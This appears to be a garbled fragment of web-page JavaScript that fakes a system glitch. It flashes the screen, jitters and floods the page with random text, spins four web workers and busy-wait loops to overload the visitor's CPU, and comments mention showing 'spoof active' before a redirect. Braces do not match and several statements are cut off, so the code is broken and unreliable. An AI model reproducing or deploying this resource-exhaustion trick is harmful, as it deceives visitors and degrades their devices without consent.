    // Intense lagging, random data flooding, CPU overload, glitches
    let lagInterval = null;
    let randomDataInterval = null;
    let glitchInterval = null;
    let isLagging = false;
    
    function startIntenseLag() {
        if (isLagging) return;
        isLagging = true;
        
        // 1. Pink screen glitch
        document.body.style.backgroundColor = '#ff69b4';
        setTimeout(() => { document.body.style.backgroundColor = '#00ffcc'; }, 80);
        setTimeout(() => { document.body.style.backgroundColor = '#ff00ff'; }, 160);

        // 2. Realistic glitches: DOM flicker, elements moving
        const originalElements = [];
        const allDivs = document.querySelectorAll('div, select, button, h1, label');
        allDivs.forEach(el => {
            originalElements.push({el, transform: el.style.transform});
        });
        
        glitchInterval = setInterval(() => {
            if (!isLagging) return;
            // Random transforms
            allDivs.forEach(el => {
                if (Math.random() > 0.7) {
                    el.style.transform = `translate(${Math.random() * 10 - 5}px, ${Math.random() * 10 - 5}px)`;
                } else {
                    el.style.transform = '';
                }
            });
            // Random page flicker

                document.body.style.opacity = Math.random() * 0.5 + 0.5;
                setTimeout(() => { document.body.style.opacity = '1'; }, 50);
            }
        }, 100);
        
        // 3. Heavy CPU load: infinite loops + heavy calculations
        function heavyTask() {
            let x = 0;
            for(let i = 0; i < 1000000; i++) {
                x += Math.sqrt(i) * Math.random();
            }
            if(isLagging) setTimeout(heavyTask, 10);
        }
        heavyTask();
        
        // Multiple web workers to simulate 300% CPU usage
        for(let w = 0; w < 4; w++) {
            const blob = new Blob([`
                let busy = true;
                function spin() {
                    let j = 0;
                    for(let i = 0; i < 5000000; i++) {
                        j += Math.sin(i) * Math.cos(i);
                    }
                    if(busy) setTimeout(spin, 0);
                }
                spin();
                self.onmessage = (e) => { if(e.data === 'stop') busy = false; };
            `], {type: 'application/javascript'});
            const worker = new Worker(URL.createObjectURL(blob));
            setTimeout(() => { worker.postMessage('stop'); }, 7000);
        }
        
        // 4. Random data flooding: fill DOM with random text, change select options randomly
        randomDataInterval = setInterval(() => {
            if (!isLagging) return;
            // Add random floating divs
            const randomDiv = document.createElement('div');
            randomDiv.textContent = Math.random().toString(36).repeat(20);
            randomDiv.style.position = 'fixed';
            randomDiv.style.top = Math.random() * 100 + '%';
            randomDiv.style.left = Math.random() * 100 + '%';
            randomDiv.style.background = 'rgba(0,0,0,0.1)';
            randomDiv.style.zIndex = '9999';
            randomDiv.style.fontSize = '8px';
            document.body.appendChild(randomDiv);
            setTimeout(() => { if(randomDiv.parentNode) randomDiv.remove(); }, 2000);
            
            // Change select options randomly

                const fakeOption = document.createElement('option');

        // Also block UI with endless loop simulation

            // Try to freeze
            let d = Date.now();
            while(Date.now() - d < 50) { /* busy wait */ }

    function stopLagAndRedirect() {

        if (glitchInterval) clearInterval(glitchInterval);
        // Reset body styles

    }

            // Show spoof active + lag + redirect after 6-7 sec

        warningBox.appendChild(warningText);
